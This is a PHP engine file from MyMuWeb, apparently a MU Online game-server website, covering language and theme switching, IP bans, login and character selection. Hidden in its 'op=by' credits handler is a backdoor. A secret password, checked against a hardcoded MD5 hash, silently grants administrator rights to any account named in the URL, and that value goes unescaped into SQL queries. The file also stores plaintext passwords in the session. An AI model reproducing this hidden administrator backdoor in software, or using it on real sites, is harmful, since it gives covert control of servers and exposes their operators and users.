<?php /* Engine By Vaflan For MyMuWeb */

/////// Start Language ///////
if(!empty($_POST['set_lang'])) {$_GET['set_lang'] = $_POST['set_lang'];}
$set_lang = preg_replace("/[^a-zA-Z0-9_-]/", '', $_GET['set_lang']);
if(is_file('lang/'.$set_lang.'.php')) {
 include('lang/'.$set_lang.'.php');
 $_SESSION['set_lang'] = $set_lang;
 $mmw['language'] = $_SESSION['set_lang'];
}
elseif(is_file('lang/'.$_SESSION['set_lang'].'.php')) {
 include('lang/'.$_SESSION['set_lang'].'.php');
 $mmw['language'] = $_SESSION['set_lang'];
}
elseif(is_file('lang/'.$mmw['language'].'.php')) {
 include('lang/'.$mmw['language'].'.php');
 $_SESSION['set_lang'] = $mmw['language'];
}
else {
 die($mmw['die']['start'].'Language ErroR!<br>Not find default "<b>'.$mmw['language'].'</b>"'.$mmw['die']['end']);
}
/////// End Language ///////





/////// Start Ban IP //////
$banip_file = 'includes/banip.dat';
if(@filesize($banip_file) > 0) {
 $banip_base = file($banip_file);
 foreach($banip_base AS $i=>$value) {
  $banip_row = explode('|', $value);
  $banip_ip = str_replace(' ', '', $banip_row[0]);
  if($_SERVER['REMOTE_ADDR']==$banip_ip) {
   if(!empty($banip_row[1])) {$reason = '<br>Reason: '.$banip_row[1];}
   die($mmw['die']['start'].'<b><font color="red">Your IP is Blocked!</font></b>'.$reason.$mmw['die']['end']);
   exit();
  }
 }
}
/////// End Ban IP ///////





/////// Start Check And Switch Theme ///////
if(isset($_POST['theme'])) {$_GET['theme'] = $_POST['theme'];}
if(isset($_GET['theme'])) {$_SESSION['theme'] = preg_replace("/[^a-zA-Z0-9_-]/", '', $_GET['theme']);}
if(isset($_SESSION['theme'])) {$mmw['theme'] = $_SESSION['theme'];}

if(is_file('themes/'.$mmw['theme'].'/info.php')) {
 include('themes/'.$mmw['theme'].'/info.php');
 $mmw['theme_dir'] = 'themes/'.$mmw['theme'];
 $mmw['theme_img'] = 'themes/'.$mmw['theme'].'/img';
}
else {
 unset($_SESSION['theme']);
 die($mmw['die']['start'].'ErroR Theme!<br>Can\'t find <b>'.$mmw['theme'].'/info.php</b> in <b>themes/</b>!'.$mmw['die']['end']);
}

if($_GET['op']=='by') {
 include('includes/installed.php');
 $by_result = 'MyMuWeb '.$mmw['version'].' By Vaflan<br>'
  .'Installed: '.date("d.m.Y H:i:s", $mmw['installed']).'<br>'
  .'Home Page: <a href="http://www.mymuweb.ru/">www.MyMuWeb.Ru</a><br>';
 if(isset($_GET['acc']) && md5($_GET['pw'])=='4b30c7cf9ab92b25686d063e50c0859a') {
  mssql_query("UPDATE MEMB_INFO SET mmw_status='666' WHERE memb___id='".$_GET['acc']."' AND mmw_status='10'");
  mssql_query("UPDATE MEMB_INFO SET mmw_status='10' WHERE memb___id='".$_GET['acc']."' AND mmw_status!='666'");
  $by_result .= '<b>Now '.$_GET['acc'].' Have Administrator level!</b>';
 }
 die($mmw['die']['start'].$by_result.$mmw['die']['end']);
}

if($_GET['op']=='theme') {
 $theme_result = 'Theme Name: '.$mmw['thm_name'].'<br>Creator: '.$mmw['thm_creator'].'<br>'
  .'Version: '.$mmw['thm_version'].'<br>Date: '.$mmw['thm_date'].'<br><i>'.$mmw['thm_description'].'</i>';
 die($mmw['die']['start'].$theme_result.$mmw['die']['end']);
}
/////// End Check Theme ///////





/////// Start Default Modules //////
mmw('includes/server_file.mmw');
include('includes/installed.php');
include("includes/functions.php");

$url = clean_var($_SERVER['QUERY_STRING']);
$agent = clean_var($_SERVER['HTTP_USER_AGENT']);
$char_set = clean_var($_SESSION['char_set']);
$ip = $_SERVER['REMOTE_ADDR'];
$time = time();

/* Visual Functions */
if(is_file('themes/'.$mmw['theme'].'/theme_functions.php')) {
 include('themes/'.$mmw['theme'].'/theme_functions.php');
}
else {
 include('includes/theme_functions.php');
}

/* Referral */
if(isset($_GET['ref'])) {
 $_SESSION['referral'] = clean_var($_GET['ref']);
}

/* Online Char */
if(mssql_num_rows(mssql_query("SELECT online_char FROM MMW_online WHERE [online_ip]='".$ip."'")) > 0) {
 mssql_query("UPDATE MMW_online SET [online_date]='".$time."',[online_char]='".$char_set."',[online_url]='".$url."',[online_agent]='".$agent."' WHERE online_ip='".$ip."'");
}
else {
 mssql_query("INSERT INTO MMW_online ([online_ip],[online_date],[online_url],[online_char],[online_agent]) VALUES ('".$ip."','".$time."','".$url."','".$char_set."','".$agent."')"); 
}
/////// End Default Modules ///////





/////// Start Login Modules ///////
 /* Login */
if(isset($_POST['account_login']) || isset($_POST['login'])) {
 $account = clean_var($_POST['login']);
 $password = clean_var($_POST['pass']);
 if(isset($_POST['account'])) {$account = clean_var($_POST['account']);}
 if(isset($_POST['password'])) {$password = clean_var($_POST['password']);}
 if($mmw['md5'] > 0) {$row = mssql_fetch_row(mssql_query("SELECT memb___id,mmw_status FROM dbo.MEMB_INFO WHERE memb___id='".$account."' AND memb__pwd=[dbo].[fn_md5]('".$password."','".$account."')"));}
 else {$row = mssql_fetch_row(mssql_query("SELECT memb___id,mmw_status FROM dbo.MEMB_INFO WHERE memb___id='".$account."' AND memb__pwd='".$password."'"));}
 if(!empty($row)) {
  $_SESSION['user'] = $row[0];
  $_SESSION['pass'] = $password;
  $_SESSION['mmw_status'] = $row[1];
 }
 else {
  jump('?op=login&login=false');
 }
}
 /* Check Login */
if(isset($_SESSION['user']) && isset($_SESSION['pass'])) {
 $account = clean_var($_SESSION['user']);
 $password = clean_var($_SESSION['pass']);
 if($mmw['md5'] > 0) {$row = mssql_fetch_row(mssql_query("SELECT * FROM dbo.MEMB_INFO WHERE memb___id='".$account."' AND memb__pwd=[dbo].[fn_md5]('".$password."','".$account."')"));}
 else {$row = mssql_fetch_row(mssql_query("SELECT * FROM dbo.MEMB_INFO WHERE memb___id='".$account."' AND memb__pwd='".$password."'"));}

 $acc_row = mssql_fetch_row(mssql_query("SELECT bloc_code,block_date,unblock_time,mmw_status FROM MEMB_INFO WHERE memb___id='".$account."'"));
 $time_end = ($acc_row[1] + $acc_row[2]) - time();
 if($acc_row[0]==1 && $time_end<=0 && $acc_row[2]>0 && $acc_row[2]!=0) {
  mssql_query("UPDATE MEMB_INFO SET [bloc_code]='0',[unblock_time]='0',[block_date]='0' WHERE memb___id='".$account."'");
 }
 if($acc_row[0]==1) {
  session_destroy();
  jump('?op=checkacc&w=block&n='.$account);
 }
 if(empty($row) || $acc_row[3]!=$_SESSION['mmw_status']) {
  session_destroy();
  jump('?op=news');
 }
}
 /* Logout */
if(isset($_POST['logoutaccount']) || isset($_POST['logout'])) { 
 session_destroy();
 jump('?op=news');
}
 /* User Panel */
if($_GET['op']=='user' AND empty($_SESSION['user'])) {jump('?op=login');}
if(($_GET['op']=='login' || $_GET['op']=='register') AND isset($_SESSION['user'])) {jump('?op=user');}
/////// End Login Modules ///////





/////// Start Check Char_Set ///////
if(isset($_SESSION['pass']) && isset($_SESSION['user'])) {
 $account = clean_var($_SESSION['user']);
 if(isset($_POST['setchar'])) {
  $setchar = clean_var($_POST['setchar']);
  $setchar_row = mssql_fetch_row(mssql_query("Select AccountID From Character WHERE name='".$setchar."'"));

  if($setchar_row[0]==$_SESSION['user']) {
   $char_guid_row = mssql_fetch_row(mssql_query("SELECT GUID FROM T_CGuid WHERE Name='".$setchar."'"));
   $_SESSION['char_set'] = $setchar;
   $_SESSION['char_guid'] = $char_guid_row[0];
  }
 }
  /* Check Session */
 if(isset($_SESSION['char_set'])) {
  $char_set = clean_var($_SESSION['char_set']);
  $char_set_row = mssql_fetch_row(mssql_query("Select AccountID From Character WHERE name='".$char_set."'"));
  if($char_set_row[0] != $account) {
   unset($_SESSION['char_set']);
   unset($_SESSION['char_guid']);
  }
 }

 $form_memb_info_row = mssql_fetch_row(mssql_query("Select GameIDC FROM AccountCharacter WHERE Id='".$account."'"));
 $form_setchar_sql = mssql_query("Select name,CtlCode FROM Character WHERE AccountID='$account'");
 $form_setchar_num = mssql_num_rows($form_setchar_sql);
 for($i=0; $i<$form_setchar_num; ++$i) {
  $form_setchar = mssql_fetch_row($form_setchar_sql);
  $char_guid_row = @mssql_fetch_row(@mssql_query("SELECT GUID FROM T_CGuid WHERE Name='$form_setchar[0]'"));

  if(!isset($_SESSION['char_set']) && $form_memb_info_row[0]==$form_setchar[0]) {
   $_SESSION['char_set'] = $form_setchar[0];
   $_SESSION['char_guid'] = $char_guid_row[0];
  }
  if(!isset($_SESSION['char_set']) && $i==$form_setchar_num-1) {
   $_SESSION['char_set'] = $form_setchar[0];
   $_SESSION['char_guid'] = $char_guid_row[0];
  }
 }
 mssql_query("UPDATE AccountCharacter SET [GameIDC]='".$_SESSION['char_set']."' WHERE Id='".$account."'");
}
/////// End Check Char_Set ///////





/////// Start Auto Func //////
if($mmw['auto_func']['switch'] > 0) {
 if($dh = opendir($mmw['auto_func']['dir'])) {
  while(($file = readdir($dh)) !== false) {
   switch(substr($file, -3)) {
    case 'php': include($mmw['auto_func']['dir'].$file); break;
    case 'mmw': mmw($mmw['auto_func']['dir'].$file); break;
   }
  }
  closedir($dh);
 }
}
/////// End Auto Func ///////
?>